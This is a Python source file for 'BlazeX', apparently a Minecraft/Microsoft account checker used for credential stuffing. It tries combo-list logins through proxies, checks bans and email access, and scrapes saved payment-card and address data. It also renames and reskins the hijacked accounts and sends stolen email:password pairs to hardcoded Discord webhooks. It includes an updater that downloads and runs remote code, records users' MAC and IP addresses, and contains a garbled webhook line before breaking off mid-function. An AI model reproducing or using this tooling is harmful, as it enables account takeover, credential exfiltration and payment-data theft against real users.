import pyrebase
import requests
import uuid
from packaging import version
import os
import sys
import time
import re
import readchar
import threading
import random
import urllib3
import json
import concurrent.futures
import traceback
import warnings
import socket
import socks
import string
from datetime import datetime, timezone
from colorama import Fore
from console import utils
from tkinter import filedialog
from urllib.parse import urlparse, parse_qs
from io import StringIO
from http.cookiejar import MozillaCookieJar
import tempfile
import shutil
import ctypes

# banchecking
from minecraft.networking.connection import Connection
from minecraft.authentication import AuthenticationToken, Profile
from minecraft.networking.packets import clientbound
from minecraft.exceptions import LoginDisconnect

# Firebase configuration (replace with your actual Firebase config)
firebase_config = {
    "apiKey": "AIzaSyAb_Uvev5oG2TrYc-RHLlT1qNM_k4OkxKk",
    "authDomain": "blazexstocker.firebaseapp.com",
    "databaseURL": "https://blazexstocker-default-rtdb.asia-southeast1.firebasedatabase.app/",
    "storageBucket": "blazexstocker.firebasestorage.app",
}

# Initialize Firebase
firebase = pyrebase.initialize_app(firebase_config)
db = firebase.database()

# Current version of the script
VERSION = "1.0.0"

logo = Fore.CYAN + '''
 ██████╗ ██╗      █████╗  ███████╗  ███████╗     ██╗  ██╗
 ██╔══██╗██║     ██╔══██╗ ╚══███╔╝  ██╔════╝     ╚██╗██╔╝
 ██████╔╝██║     ███████║   ███╔╝   █████╗        ╚███╔╝ 
 ██╔══██╗██║     ██╔══██║  ███╔╝    ██╔══╝        ██╔██╗ 
 ██████╔╝██████╗ ██║  ██║ ███████╗  ███████╗     ██╔╝  ██╗
 ╚═════╝ ╚═════╝╚═╝  ╚═╝ ╚══════╝  ╚══════╝     ╚═╝   ╚═╝   ~ The Ultimate Minecraft Checker! 
   Support: Telegram @HarshOGG or @sarthakog [t.me/blaze_cloud] 
            Discord @harshhhh_og or @sarthakkul  [discord.gg/blaze_cloud] '''

sFTTag_url = "https://login.live.com/oauth20_authorize.srf?client_id=00000000402B5328&redirect_uri=https://login.live.com/oauth20_desktop.srf&scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch&response_type=token&locale=en"
Combos = []
proxylist = []
banproxies = []
fname = ""
results_dir = None
RESTOCKER_NAME = "Restocker 1"  # Hardcoded restocker name
hits, bad, twofa, cpm, cpm1, errors, retries, checked, vm, sfa, mfa, maxretries, xgp, xgpu, other = 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0
urllib3.disable_warnings()
warnings.filterwarnings("ignore")

# Decoding dictionary for the substitution cipher
decode_dict = {
    "%aD$": "A", "#K3!": "B", "@w2&": "C", "]4G^": "D", "!Yz9": "E", "*Pq7": "F", "$1jR": "G", "^xM#": "H",
    "&N@0": "I", "(cT$": "J", "~vE%": "K", "+3Z)": "L", "?rH{": "M", "`mB]": "N", "/tF*": "O", "=2u(": "P",
    "|Sa5": "Q", "<gJ!": "R", ">Lb4": "S", ";oV$": "T", ":nW^": "U", ",Xe@": "V", ".kI#": "W", "0Qi%": "X",
    "9Uh)": "Y", "8Cy(": "Z",
    "7Az_": "a", "6Rv+": "b", "5Md#": "c", "4Tp!": "d", "3Bo&": "e", "2Nc$": "f", "1Yl^": "g", "0Kj*": "h",
    "ZWq~": "i", "YFe(": "j", "XDt)": "k", "VGi_": "l", "USa{": "m", "TMb[": "n", "RCo]": "o", "QPn+": "p",
    "OKv/": "q", "NJu|": "r", "MIl>": "s", "LHw<": "t", "KGe:": "u", "JBf;": "v", "IEd,": "w", "Hc@.": "x",
    "Gba0": "y", "FZ91": "z",
    "eX+3": "0", "dW$4": "1", "cV!5": "2", "bU#6": "3", "aT^7": "4", "ZS&8": "5", "YR*9": "6", "XQ(0": "7",
    "WP)1": "8", "VO_2": "9",
    "nzio": "!", "m@s4": "@", "l#t5": "#", "k$u6": "$", "j%v7": "%", "i^w8": "^", "h&x9": "&", "g*y0": "*",
    "f(z1": "(", "e)a2": ")", "d-b3": "-", "c_c4": "_", "b+a5": "+", "a=b6": "=", "Z{c7": "{", "Y}d8": "}",
    "X[e9": "[", "W]f0": "]", "V|g1": "|", "U\\h2": "\\", "T:i3": ":", "S;j4": ";", 'R"k5': '"', "Q'l6": "'",
    "P<m7": "<", "O>n8": ">", "N,o9": ",", "M.p0": ".", "L?q1": "?", "K/r2": "/", "J`s3": "`"
}

def decode_combo(coded_combo):
    """Decode a coded combo string using the decode_dict."""
    decoded = ''
    for i in range(0, len(coded_combo), 4):
        chunk = coded_combo[i:i+4]
        if chunk in decode_dict:
            decoded += decode_dict[chunk]# Passkey Protection System
def get_mac():
    return ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(5, -1, -1)])

def get_ip():
    try:
        return requests.get('https://api.ipify.org').text
    except:
        return "Unknown"

def check_passkey():
    mac = get_mac()
    ip = get_ip()
    passkey = input("Enter passkey: ")
    allowed = db.child("allowed_passkeys").child(passkey).get().val()
    if not allowed:
        print("Invalid passkey.")
        sys.exit(1)
    passkey_data = db.child("passkeys").child(passkey).get().val()
    if passkey_data:
        if passkey_data["mac"] != mac:
            # Self-destruct
            try:
                os.remove(__file__)
            except:
                pass
            # Send alert to Firebase
            db.child("alerts").push({
                "passkey": passkey,
                "mac": mac,
                "ip": ip,
                "timestamp": time.time()
            })
            print("Passkey already used on another device. Script will self-destruct.")
            sys.exit(1)
    else:
        # Associate passkey with this MAC
        db.child("passkeys").child(passkey).set({"mac": mac})
    # Log usage in Firebase
    db.child("logs").push({
        "passkey": passkey,
        "mac": mac,
        "ip": ip,
        "timestamp": time.time()
    })

# Auto-Update System
def check_for_updates():
    latest_version = db.child("latest_version").get().val()
    if latest_version and version.parse(latest_version) > version.parse(VERSION):
        download_url = db.child("download_url").get().val()
        if download_url:
            # Download new script
            new_script = requests.get(download_url).text
            # Save to temporary file
            temp_file = "BlazeXStocker_tmp.py"
            with open(temp_file, "w") as f:
                f.write(new_script)
            # Replace current script
            os.rename(temp_file, __file__)
            # Restart script
            os.execv(sys.executable, ['python'] + sys.argv)
        else:
            print("Update available but no download URL provided.")

class Config:
    def __init__(self):
        self.data = {}

    def set(self, key, value):
        self.data[key] = value

    def get(self, key):
        return self.data.get(key)

config = Config()

# Hardcoded configuration settings
config.set('webhook', 'paste your discord webhook here')
config.set('banned_webhook', 'paste banned accounts webhook')
config.set('unbanned_webhook', 'paste unbanned accounts webhook')
config.set('embed', True)
config.set('message', '''@everyone HIT: ||`<email>:<password>`||
Name: <name>
Account Type: <type>
Hypixel: <hypixel>
Hypixel Level: <level>
First Hypixel Login: <firstlogin>
Last Hypixel Login: <lastlogin>
Optifine Cape: <ofcape>
MC Capes: <capes>
Email Access: <access>
Hypixel Skyblock Coins: <skyblockcoins>
Hypixel Bedwars Stars: <bedwarsstars>
Banned: <banned>
Can Change Name: <namechange>
Last Name Change: <lastchanged>''')
config.set('proxylessban', True)
config.set('log', False)
config.set('autoscrape', 5)
config.set('setname', True)
config.set('name', 'BlazeX by HarshOGG and SteveOG')
config.set('setskin', True)
config.set('skin', 'https://s.namemc.com/i/bc8429d1f2e15539.png')
config.set('variant', 'classic')
config.set('hypixelname', True)
config.set('hypixellevel', True)
config.set('hypixelfirstlogin', True)
config.set('hypixellastlogin', True)
config.set('optifinecape', True)
config.set('mcapes', True)
config.set('access', True)
config.set('hypixelsbcoins', True)
config.set('hypixelbwstars', True)
config.set('hypixelban', True)
config.set('namechange', True)
config.set('lastchanged', True)
config.set('payment', True)

maxretries = 5

class Capture:
    def __init__(self, email, password, name, capes, uuid, token, type, session):
        self.email = email
        self.password = password
        self.name = name
        self.capes = capes
        self.uuid = uuid
        self.token = token
        self.type = type
        self.session = session
        self.hypixl = None
        self.level = None
        self.firstlogin = None
        self.lastlogin = None
        self.cape = None
        self.access = None
        self.sbcoins = None
        self.bwstars = None
        self.banned = None
        self.namechanged = None
        self.lastchanged = None

    def builder(self):
        message = f"Email: {self.email}\nPassword: {self.password}\nName: {self.name}\nCapes: {self.capes}\nAccount Type: {self.type}"
        if self.hypixl != None: message += f"\n-Agama: {self.hypixl}"
        if self.level != None: message += f"\nHypixel Level: {self.level}"
        if self.firstlogin != None: message += f"\nFirst Hypixel Login: {self.firstlogin}"
        if self.lastlogin != None: message += f"\nLast Hypixel Login: {self.lastlogin}"
        if self.cape != None: message += f"\nOptifine Cape: {self.cape}"
        if self.access != None: message += f"\nEmail Access: {self.access}"
        if self.sbcoins != None: message += f"\nHypixel Skyblock Coins: {self.sbcoins}"
        if self.bwstars != None: message += f"\nHypixel Bedwars Stars: {self.bwstars}"
        if config.get('hypixelban') is True: message += f"\nHypixel Banned: {self.banned or 'Unknown'}"
        if self.namechanged != None: message += f"\nCan Change Name: {self.namechanged}"
        if self.lastchanged != None: message += f"\nLast Name Change: {self.lastchanged}"
        return message

    def notify(self):
        global errors
        try:
            if str(self.banned).lower() == "false":
                webhook_url = 'https://discord.com/api/webhooks/1381435355479281754/d6luUOgyfEFvb7V6Y4ttR6mBPS_GtTktW_6auqFz5lHbn9VfxgY7rD5t_quadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquadquad" target="_blank">https://discord.com/api/webhooks/1379631813932224634/c5QCIgiRGK4AmKjLkXBM1vNZjVePeqhXvETf2CT1p6NlOpTOb_3I3hXdd_g4G1Rx3U2w'
            if config.get('embed') == True:
                payload = {
                    "username": "🉑・ BlazeCloud - The Best Cloud!",
                    "avatar_url": "https://cdn.discord.com/attachments/1347495402013855785/1365946274410401834/file_00000000f68051f8a40229b454cd5c1d_conversation_id67eff61d-d32c-8000-beef-73.webp?ex=68472fd9&is=6845de59&hm=c5abf6b47608d0e43880eb7fa84b3db8762a5b7b738befe11999d2fdc50ce655&",
                    "embeds": [
                        {
                            "author": {
                                "name": "📈・ BlazeCloud Minecraft Hits!",
                                "url": "https://discord.gg/blazexcloud",
                                "icon_url": "https://cdn.discord.com/attachments1347495402013855785/1365946274410401834/file_00000000f68051f8a40229b454cd5c1d_conversation_id67eff61d-d32c-8000-beef-73.webp?ex=68472fd9&is=6845de59&hm=c5abf6b47608d0e43880eb7fa84b3db8762a5b7b738befe11999d2fdc50ce655&"
                            },
                            "title": self.name,
                            "color": 3821605,
                            "fields": [
                                {"name": "📧 Email", "value": f"||{self.email}||", "inline": True},
                                {"name": "🔑 Password", "value": f"||{self.password}||", "inline": True},
                                {"name": "⛔ Banned", "value": f"{self.banned or 'Unknown'}", "inline": True},
                                {"name": "🎮 Hypixel Name", "value": self.hypixl or "N/A", "inline": True},
                                {"name": "🔄 Can Change Name", "value": self.namechanged or "N/A", "inline": True},
                                {"name": "📊 Hypixel Level", "value": self.level or "N/A", "inline": True},
                                {"name": "🦸 Capes", "value": f"{self.capes or 'None'} | Optifine: {self.cape or 'No'}", "inline": True},
                                {"name": "🎯 Account Type", "value": self.type or "N/A", "inline": True},
                                {"name": "🛡️ Combo", "value": f"||{self.email}:{self.password}||", "inline": True},
                            ],
                            "thumbnail": {"url": f"https://visage.surgeplay.com/bust/{self.name}?y=-40&quality=lossless"},
                            "footer": {
                                "text": f"🪐・ Hits By .gg/blazecloud - Checked by {RESTOCKER_NAME}",
                                "icon_url": "https://cdn.discord.com/attachments/1347495402013855785/1365946274410401834/file_00000000f68051f8a40229b454cd5c1d_conversation_id67eff61d-d32c-8000-beef-73.webp?ex=68472fd9&is=6845de59&hm=c5abf6b47608d0e43880eb7fa84b3db8762a5b7b738befe11999d2fdc50ce655&"
                            }
                        }
                    ]
                }
            else:
                content = config.get('message') \
                    .replace("<email>", self.email) \
                    .replace("<password>", self.password) \
                    .replace("<name>", self.name or "N/A") \
                    .replace("<hypixel>", self.hypixl or "N/A") \
                    .replace("<level>", self.level or "N/A") \
                    .replace("<firstlogin>", self.firstlogin or "N/A") \
                    .replace("<lastlogin>", self.lastlogin or "N/A") \
                    .replace("<ofcape>", self.cape or "N/A") \
                    .replace("<capes>", self.capes or "N/A") \
                    .replace("<access>", self.access or "N/A") \
                    .replace("<skyblockcoins>", self.sbcoins or "N/A") \
                    .replace("<bedwarsstars>", self.bwstars or "N/A") \
                    .replace("<banned>", self.banned or "Unknown") \
                    .replace("<namechange>", self.namechanged or "N/A") \
                    .replace("<lastchanged>", self.lastchanged or "N/A") \
                    .replace("<type>", self.type or "N/A") + f" - Checked by {RESTOCKER_NAME}"
                payload = {
                    "content": content,
                    "username": "BlazeX by HarshOGG and SteveOG"
                }
            requests.post(webhook_url, data=json.dumps(payload), headers={"Content-Type": "application/json"}, timeout=10)
        except:
            pass

    def hypixel(self):
        global errors
        try:
            if config.get('hypixelname') or config.get('hypixellevel') or config.get('hypixelfirstlogin') or config.get('hypixellastlogin') or config.get('hypixelbwstars'):
                tx = requests.get('https://plancke.io/hypixel/player/stats/' + self.name, proxies=getproxy(), headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0'}, verify=False).text
                try:
                    if config.get('hypixelname'): self.hypixl = re.search('(?<=content=\"Plancke\" /><meta property=\"og:locale\" content=\"en_US\" /><meta property=\"og:description\" content=\").+?(?=\")', tx).group()
                except: pass
                try:
                    if config.get('hypixellevel'): self.level = re.search('(?<=Level:</b> ).+?(?=<br/><b>)', tx).group()
                except: pass
                try:
                    if config.get('hypixelfirstlogin'): self.firstlogin = re.search('(?<=<b>First login: </b>).+?(?=<br/><b>)', tx).group()
                except: pass
                try:
                    if config.get('hypixellastlogin'): self.lastlogin = re.search('(?<=<b>Last login: </b>).+?(?=<br/>)', tx).group()
                except: pass
                try:
                    if config.get('hypixelbwstars'): self.bwstars = re.search('(?<=<li><b>Level:</b> ).+?(?=</li>)', tx).group()
                except: pass
            if config.get('hypixelsbcoins'):
                try:
                    req = requests.get("https://sky.shiiyu.moe/stats/" + self.name, proxies=getproxy(), verify=False)
                    self.sbcoins = re.search('(?<= Networth: ).+?(?=\n)', req.text).group()
                except: pass
        except: errors += 1

    def optifine(self):
        if config.get('optifinecape'):
            try:
                txt = requests.get(f'http://s.optifine.net/capes/{self.name}.png', proxies=getproxy(), verify=False).text
                if "Not found" in txt: self.cape = "No"
                else: self.cape = "Yes"
            except: self.cape = "Unknown"

    def full_access(self):
        global mfa, sfa
        if config.get('access'):
            try:
                out = json.loads(requests.get(f"https://email.avine.tools/check?email={self.email}&password={self.password}", verify=False).text)
                if out["Success"] == 1:
                    self.access = "True"
                    mfa += 1
                    open(os.path.join(results_dir, "MFA.txt"), 'a').write(f"{self.email}:{self.password}\n")
                else:
                    sfa += 1
                    self.access = "False"
                    open(os.path.join(results_dir, "SFA.txt"), 'a').write(f"{self.email}:{self.password}\n")
            except: self.access = "Unknown"

    def namechange(self):
        if config.get('namechange') or config.get('lastchanged'):
            tries = 0
            while tries < maxretries:
                try:
                    check = self.session.get('https://api.minecraftservices.com/minecraft/profile/namechange', headers={'Authorization': f'Bearer {self.token}'})
                    if check.status_code == 200:
                        try:
                            data = check.json()
                            if config.get('namechange'):
                                self.namechanged = str(data.get('nameChangeAllowed', 'N/A'))
                            if config.get('lastchanged'):
                                created_at = data.get('createdAt')
                                if created_at:
                                    try:
                                        given_date = datetime.strptime(created_at, "%Y-%m-%dT%H:%M:%S.%fZ")
                                    except ValueError:
                                        given_date = datetime.strptime(created_at, "%Y-%m-%dT%H:%M:%SZ")
                                    given_date = given_date.replace(tzinfo=timezone.utc)
                                    formatted = given_date.strftime("%m/%d/%Y")
                                    current_date = datetime.now(timezone.utc)
                                    difference = current_date - given_date
                                    years = difference.days // 365
                                    months = (difference.days % 365) // 30
                                    days = difference.days
                                    if years > 0:
                                        self.lastchanged = f"{years} {'year' if years == 1 else 'years'} - {formatted} - {created_at}"
                                    elif months > 0:
                                        self.lastchanged = f"{months} {'month' if months == 1 else 'months'} - {formatted} - {created_at}"
                                    else:
                                        self.lastchanged = f"{days} {'day' if days == 1 else 'days'} - {formatted} - {created_at}"
                                    break
                        except: pass
                    if check.status_code == 429:
                        if len(proxylist) < 5: time.sleep(3)
                except: pass
                tries += 1
                retries += 1

    def save_cookies(self, type):
        cfname = os.path.join(results_dir, 'Cookies')
        if not os.path.exists(cfname):
            os.makedirs(cfname)
        bfname = os.path.join(cfname, type)
        if not os.path.exists(bfname):
            os.makedirs(bfname)
        cookie_file_path = os.path.join(bfname, f'{self.name}.txt')
        jar = MozillaCookieJar(cookie_file_path)
        for cookie in self.session.cookies:
            jar.set_cookie(cookie)
        jar.save(ignore_discard=True)
        with open(cookie_file_path, 'r') as file:
            lines = file.readlines()
        lines = lines[3:]
        while lines and lines[0].strip() == '':
            lines.pop(0)
        with open(cookie_file_path, 'w') as file:
            file.writelines(lines)

    def ban(self, session):
        global errors
        if config.get('hypixelban') is True:
            auth_token = AuthenticationToken(username=self.name, access_token=self.token, client_token=uuid.uuid4().hex)
            auth_token.profile = Profile(id_=self.uuid, name=self.name)
            tries = 0
            while tries < maxretries:
                connection = Connection("alpha.hypixel.net", 25565, auth_token=auth_token, initial_version=47, allowed_versions={"1.8", 47})
                @connection.listener(clientbound.login.DisconnectPacket, early=True)
                def login_disconnect(packet):
                    data = json.loads(str(packet.json_data))
                    if "Suspicious activity" in str(data):
                        self.banned = f"[Permanently] Suspicious activity has been detected on your account. Ban ID: {data['extra'][6]['text'].strip()}"
                        with open(os.path.join(results_dir, "Banned.txt"), 'a') as f: f.write(f"{self.email}:{self.password}\n")
                        self.save_cookies('Banned')
                    elif "temporarily banned" in str(data):
                        self.banned = f"[{data['extra'][1]['text']}] {data['extra'][4]['text'].strip()} Ban ID: {data['extra'][8]['text'].strip()}"
                        with open(os.path.join(results_dir, "Banned.txt"), 'a') as f: f.write(f"{self.email}:{self.password}\n")
                        self.save_cookies('Banned')
                    elif "You are permanently banned from this server!" in str(data):
                        self.banned = f"[Permanently] {data['extra'][2]['text'].strip()} Ban ID: {data['extra'][6]['text'].strip()}"
                        with open(os.path.join(results_dir, "Banned.txt"), 'a') as f: f.write(f"{self.email}:{self.password}\n")
                        self.save_cookies('Banned')
                    elif "The Hypixel Alpha server is currently closed!" in str(data):
                        self.banned = "False"
                        with open(os.path.join(results_dir, "Unbanned.txt"), 'a') as f: f.write(f"{self.email}:{self.password}\n")
                        self.save_cookies('Unbanned')
                    elif "Failed cloning your SkyBlock data" in str(data):
                        self.banned = "False"
                        with open(os.path.join(results_dir, "Unbanned.txt"), 'a') as f: f.write(f"{self.email}:{self.password}\n")
                        self.save_cookies('Unbanned')
                    else:
                        self.banned = ''.join(item["text"] for item in data["extra"])
                        with open(os.path.join(results_dir, "Banned.txt"), 'a') as f: f.write(f"{self.email}:{self.password}\n")
                        self.save_cookies('Banned')
                @connection.listener(clientbound.play.JoinGamePacket, early=True)
                def joined_server(packet):
                    if self.banned == None:
                        self.banned = "False"
                        with open(os.path.join(results_dir, "Unbanned.txt"), 'a') as f: f.write(f"{self.email}:{self.password}\n")
                        self.save_cookies('Unbanned')
                try:
                    if len(banproxies) > 0:
                        proxy = random.choice(banproxies)
                        if '@' in proxy:
                            atsplit = proxy.split('@')
                            socks.set_default_proxy(socks.SOCKS5, addr=atsplit[1].split(':')[0], port=int(atsplit[1].split(':')[1]), username=atsplit[0].split(':')[0], password=atsplit[0].split(':')[1])
                        else:
                            ip_port = proxy.split(':')
                            socks.set_default_proxy(socks.SOCKS5, addr=ip_port[0], port=int(ip_port[1]))
                        socket.socket = socks.socksocket
                    original_stderr = sys.stderr
                    sys.stderr = StringIO()
                    try:
                        connection.connect()
                        c = 0
                        while self.banned == None or c < 1000:
                            time.sleep(.01)
                            c += 1
                        connection.disconnect()
                    except: pass
                    sys.stderr = original_stderr
                except: pass
                if self.banned != None: break
                tries += 1

    def setname(self):
        newname = ''.join(random.choices(string.ascii_lowercase + string.digits, k=3)) + "_" + config.get('name') + "_" + ''.join(random.choices(string.ascii_lowercase + string.digits, k=3))
        tries = 0
        while tries < maxretries:
            try:
                changereq = self.session.put("https://api.minecraftservices.com/minecraft/profile/name/" + newname, headers={'Authorization': f'Bearer {self.token}'})
                if changereq.status_code == 200:
                    self.type = self.type + " [SET MC]"
                    self.name = self.name + f" -> {newname}"
                    break
                elif changereq.status_code == 429:
                    time.sleep(3)
            except: pass
            tries += 1

    def setskin(self):
        tries = 0
        while tries < maxretries:
            try:
                data = {
                    "url": config.get('skin'),
                    "variant": config.get('variant')
                }
                changereq = self.session.post("https://api.minecraftservices.com/minecraft/profile/skins", json=data, headers={'Authorization': f'Bearer {self.token}', 'Content-Type': 'application/json'})
                if changereq.status_code == 200:
                    self.type = self.type + " [SET SKIN]"
                    break
                elif changereq.status_code == 429:
                    time.sleep(3)
            except: pass
            tries += 1

    def handle(self, session):
        global hits
        if self.name != 'N/A':
            try: self.hypixel()
            except: pass
            try: self.optifine()
            except: pass
            try: self.full_access()
            except: pass
            try: self.namechange()
            except: pass
            try: self.ban(session)
            except: pass
            capes_folder = os.path.join(results_dir, 'Capes')
            if not os.path.exists(capes_folder):
                os.makedirs(capes_folder)
            if self.capes:
                capes_list = self.capes.split(", ")
                sorted_capes = ", ".join(sorted(capes_list))
                cape_file_name = f"{sorted_capes}.txt"
                cape_file_path = os.path.join(capes_folder, cape_file_name)
                with open(cape_file_path, 'a') as f:
                    f.write(f"{self.email}:{self.password} (Capes: {self.capes})\n")
                capes_set = set(capes_list)
                if capes_set - {"Pan", "Common"}:
                    with open(os.path.join(results_dir, "capes.txt"), 'a') as f:
                        f.write(f"{self.email}:{self.password} (Capes: {self.capes})\n")
            if hasattr(self, 'namechanged') and self.namechanged == "True":
                with open(os.path.join(results_dir, "name_changable.txt"), 'a') as f:
                    f.write(f"{self.email}:{self.password}\n")
            if config.get('setname'): self.setname()
        else: self.setname()
        if config.get('setskin'): self.setskin()
        fullcapt = self.builder()
        if screen == "'2'": print(Fore.GREEN + fullcapt.replace('\n', ' | '))
        hits += 1
        with open(os.path.join(results_dir, "Hits.txt"), 'a') as file: file.write(f"{self.email}:{self.password}\n")
        open(os.path.join(results_dir, "Capture.txt"), 'a').write(fullcapt + "\n============================\n")
        if self.hypixl and self.hypixl != "N/A":
            rank_pattern = r'\[(VIP|MVP|\+{2,}|GM|ADMIN|OWNER|YOUTUBE|PIG\+\+\+|MOJANG|EVENTS|MCP|NPC|LOL|WAT|ADIM|ADMON|JER|JRY|JERRY|SR JERRY|PIG|APPLE|MINISTER|MAYOR|SPECIAL|CRINGblatt|GOD|ANGUS|SLOTH|BETA TESTER|Mixer|MCProHosting|HELPER|MOD|BUILD TEAM|RETIRED)\]'
            matches = re.findall(rank_pattern, self.hypixl)
            if matches:
                rank = ", ".join([f'[{m}]' for m in matches])
                ban_status = self.banned if self.banned else "Unknown"
                entry = f"{self.email}:{self.password} | Rank - {rank} | Ban status - {ban_status}\n"
                with open(os.path.join(results_dir, "rank.txt"), 'a') as f:
                    f.write(entry)
        self.notify()

def get_urlPost_sFTTag(session):
    global retries
    while True:
        try:
            r = session.get(sFTTag_url, timeout=15)
            text = r.text
            match = re.match(r'.*value="(.+?)".*', text, re.S)
            if match is not None:
                sFTTag = match.group(1)
                match = re.match(r".*urlPost:'(.+?)'.*", text, re.S)
                if match is not None:
                    return match.group(1), sFTTag, session
        except: pass
        session.proxies = getproxy()
        retries += 1

def get_xbox_rps(session, email, password, urlPost, sFTTag):
    global bad, checked, cpm, twofa, retries, checked
    tries = 0
    while tries < maxretries:
        try:
            data = {'login': email, 'loginfmt': email, 'passwd': password, 'PPFT': sFTTag}
            login_request = session.post(urlPost, data=data, headers={'Content-Type': 'application/x-www-form-urlencoded'}, allow_redirects=True, timeout=15)
            if '#' in login_request.url and login_request.url != sFTTag_url:
                token = parse_qs(urlparse(login_request.url).fragment).get('access_token', ["None"])[0]
                if token != "None":
                    return token, session
            elif 'cancel?mkt=' in login_request.text:
                data = {
                    'ipt': re.search('(?<=\"ipt\" value=\").+?(?=\">)', login_request.text).group(),
                    'pprid': re.search('(?<=\"pprid\" value=\").+?(?=\">)', login_request.text).group(),
                    'uaid': re.search('(?<=\"uaid\" value=\").+?(?=\">)', login_request.text).group()
                }
                ret = session.post(re.search('(?<=id=\"fmHF\" action=\").+?(?=\" )', login_request.text).group(), data=data, allow_redirects=True)
                fin = session.get(re.search('(?<=\"recoveryCancel\":{\"returnUrl\":\").+?(?=\",)', ret.text).group(), allow_redirects=True)
                token = parse_qs(urlparse(fin.url).fragment).get('access_token', ["None"])[0]
                if token != "None":
                    return token, session
            elif any(value in login_request.text for value in ["recover?mkt", "account.live.com/identity/confirm?mThis is likely an issue with your account or session. Try signing in again with a different browser or device."]):
                twofa += 1
                checked += 1
                cpm += 1
                if screen == "'2'": print(Fore.MAGENTA + f"2FA: {email}:{password}")
                with open(os.path.join(results_dir, "2fa.txt"), 'a') as file:
                    file.write(f"{email}:{password}\n")
                return "None", session
            elif any(value in login_request.text.lower() for value in ["password is incorrect", r"account doesn\'t exist.", "sign in to your microsoft account", "tried to sign in too many times with an incorrect account or password"]):
                bad += 1
                checked += 1
                cpm += 1
                if screen == "'2'": print(Fore.RED + f"Bad: {email}:{password}")
                with open(os.path.join(results_dir, "Bad.txt"), 'a') as f:
                    f.write(f"{email}:{password}\n")
                return "None", session
            else:
                session.proxies = getproxy()
                retries += 1
                tries += 1
        except:
            session.proxies = getproxy()
            retries += 1
            tries += 1
    bad += 1
    checked += 1
    cpm += 1
    if screen == "'2'": print(Fore.RED + f"Bad: {email}:{password}")
    with open(os.path.join(results_dir, "Bad.txt"), 'a') as f:
        f.write(f"{email}:{password}\n")
    return "None", session

def payment(session, email, password):
    global retries
    while True:
        try:
            headers = {
                "Host": "login.live.com",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.5",
                "Accept-Encoding": "gzip, deflate",
                "Connection": "close",
                "Referer": "https://account.microsoft.com/"
            }
            r = session.get('https://login.live.com/oauth20_authorize.srf?client_id=000000000004773A&response_type=token&scope=PIFD.Read+PIFD.Create+PIFD.Update+PIFD.Delete&redirect_uri=https%3A%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-silent-delegate-auth&state=%7B%22userId%22%3A%22bf3383c9b44aa8c9%22%2C%22scopeSet%22%3A%22pidl%22%7D&prompt=none', headers=headers)
            token = parse_qs(urlparse(r.url).fragment).get('access_token', ["None"])[0]
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36',
                'Pragma': 'no-cache',
                'Accept': 'application/json',
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept-Language': "en-US,en;q=0.9",
                'Authorization': f'MSADELEGATE1.0={token}',
                'Connection': 'keep-alive',
                'Content-Type': 'application/json',
                'Host': 'paymentinstruments.mp.microsoft.com',
                'ms-cV': 'FbMB+cD6byLL1mn4W/NuGH.2',
                'Origin': 'https://account.microsoft.com',
                'Referer': 'https://account.microsoft.com/',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-site',
                'Sec-GPC': '1'
            }
            r = session.get(f'https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstrumentsEx?status=active,removed&language=en-GB', headers=headers)
            def lr_parse(source, start_delim, end_delim, create_empty=True):
                pattern = re.escape(start_delim) + r'(.*?)' + re.escape(end_delim)
                match = re.search(pattern, source)
                if match: return match.group(1)
                return '' if create_empty else None
            date_registered = lr_parse(r.text, '"creationDateTime":"', 'T', create_empty=False)
            fullname = lr_parse(r.text, '"accountHolderName":"', '"', create_empty=False)
            address1 = lr_parse(r.text, '"address":{"address_line1":"', '"')
            card_holder = lr_parse(r.text, 'accountHolderName":"', '","')
            credit_card = lr_parse(r.text, 'paymentMethodFamily":"credit_card","display":{"name":"', '"')
            expiry_month = lr_parse(r.text, 'expiryMonth":"', '",')
